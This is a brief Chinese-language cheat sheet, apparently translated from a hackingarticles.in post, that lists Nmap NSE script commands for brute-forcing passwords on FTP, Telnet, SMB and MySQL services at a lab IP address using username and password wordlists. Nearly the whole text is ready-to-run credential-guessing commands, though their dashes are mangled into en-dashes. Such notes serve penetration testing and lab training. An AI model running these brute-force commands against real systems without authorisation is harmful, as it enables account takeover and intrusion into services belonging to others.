## 使用Nmap进行密码破解

**FTP BRUTE ** [^1]

`nmap -p21 –script ftp-brute.nse –script-args \`

`userdb=/root/Desktop/user.txt,passdb=/root/Desktop/pass.txt 192.168.1.105`

**TELNET BRUTE**

`nmap -p23 –script telnet-brute.nse –script-args \`

`userdb=/root/Desktop/user.txt,passdb=/root/Desktop/pass.txt 192.168.1.105`

**SMB BRUTE**

`nmap –p445 –script smb-brute.nse –script-args \`

`userdb=/root/Desktop/user.txt,passdb=/root/Desktop/pass.txt 192.168.1.105`

 **MYSQL BRUTE**

`Nmap  -sT -p3306 –script mysql-brute.nse –script-args \ `

`userdb=/root/Desktop/user.txt 192.168.1.105`

[原文](https://www.hackingarticles.in/password-cracking-using-nmap/)

---

[^1]: 使用nmap的FTP脚本暴力破解密码。